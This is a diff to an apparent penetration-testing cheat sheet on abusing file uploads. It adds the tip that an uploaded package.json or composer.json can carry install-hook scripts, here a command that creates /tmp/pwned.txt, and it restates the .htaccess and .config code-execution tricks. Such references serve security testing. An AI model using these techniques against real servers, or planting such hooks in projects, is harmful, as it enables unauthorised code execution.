@@ -96,8 +96,9 @@ Valid pictures hosting PHP code. Upload the picture and use a local file inclusi
 
 ### Configuration Files
 
-If you are trying to upload files to a PHP server, take a look at the .htaccess trick to execute code.
-If you are  trying to upload files to an ASP server, take a look at the .config trick to execute code.
+If you are trying to upload files to a :
+- PHP server, take a look at the .htaccess trick to execute code.
+- ASP server, take a look at the .config trick to execute code.
 
 Configuration files examples
 - .htaccess
@@ -105,6 +106,21 @@ Configuration files examples
 - httpd.conf
 - \_\_init\_\_.py
 
+Alternatively you may be able to upload a JSON file with a custom scripts, try to overwrite a dependency manager configuration file.
+- package.json
+    ```js
+    "scripts": {
+        "prepare" : "/bin/touch /tmp/pwned.txt"
+    }
+    ```
+- composer.json
+    ```js
+    "scripts": {
+        "pre-command-run" : [
+        "/bin/touch /tmp/pwned.txt"
+        ]
+    }
+    ```
 
 ### CVE - Image Tragik
 
